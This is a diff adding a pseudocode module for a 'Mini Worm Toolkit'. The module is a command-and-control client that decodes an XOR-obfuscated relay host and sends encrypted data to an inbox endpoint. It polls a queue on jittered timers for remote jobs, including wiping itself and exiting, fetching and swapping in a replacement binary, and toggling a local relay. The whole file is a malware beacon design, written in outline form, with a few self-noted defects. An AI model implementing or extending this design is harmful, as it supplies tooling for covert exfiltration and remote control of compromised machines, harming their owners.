@@ -1,0 +1,67 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/control.pseudo
+# HTTPS conversation with the edge relay.
+
+CONST XOR_K = <build-time constant, not the private value>
+
+FUNCTION channel_base() -> string:
+    opaque = CHANNEL_HOST_BYTES decoded from the build env
+    url = XOR each byte with XOR_K
+    IF url does not start with "http":
+        fail closed with a non-routable placeholder
+    RETURN url
+
+    # IMPLEMENTATION NOTE (defect to preserve as a warning):
+    # A naive decoder that ignores the opaque bytes will never reach
+    # a real relay. The public outline assumes the decoder is correct.
+
+SINGLETONS:
+    cipher = Envelope.from_seed(AGENT_ID)
+    http   = one TLS client, browser-like User-Agent, short timeout
+    base   = channel_base()   # lazy
+
+FUNCTION post(tag, data) -> bool:
+    (ct, nonce) = cipher.seal(data)
+    hmac = cipher.mac(data)
+    body = {
+        agent_id: AGENT_ID,
+        tag, ct, nonce, hmac
+    }
+    POST base + "/inbox"  with JSON body
+    RETURN HTTP success
+
+FUNCTION pull_jobs() -> list of strings:
+    POST base + "/queue"  { agent_id }
+    RETURN body.jobs as strings
+    # Jobs travel in the clear. Comments about HMAC-checking jobs
+    # are not implemented.
+
+FUNCTION pull_profile() -> optional JSON:
+    POST base + "/profile" { agent_id }
+    RETURN body or none
+
+FUNCTION jitter(base_secs) -> duration:
+    plus-or-minus a fraction of base_secs, minimum 1s
+
+FUNCTION dispatch(job):
+    MATCH job:
+        "/burn"        -> retire.wipe_and_exit(forced=true)
+        "/replace"     -> retire.fetch_and_swap()
+        "/whoami"      -> post("whoami", pid + relay_flag + SAFE + AGENT_ID)
+        "/relay_on"    -> if not SAFE: local_relay.enable(true)
+        "/relay_off"   -> local_relay.enable(false)
+        "/leave_quiet" -> SAFE = false   # does NOT start skipped threads
+        "/quiet"       -> SAFE = true
+        "/pace N"      -> PACE = N seconds
+        ELSE           -> ignore
+
+FUNCTION spin() -> NEVER:
+    post("hello", "up id=" + AGENT_ID)
+    LOOP:
+        FOR job IN pull_jobs(): dispatch(job)
+        sleep jitter(PACE or (60 if SAFE else 10))
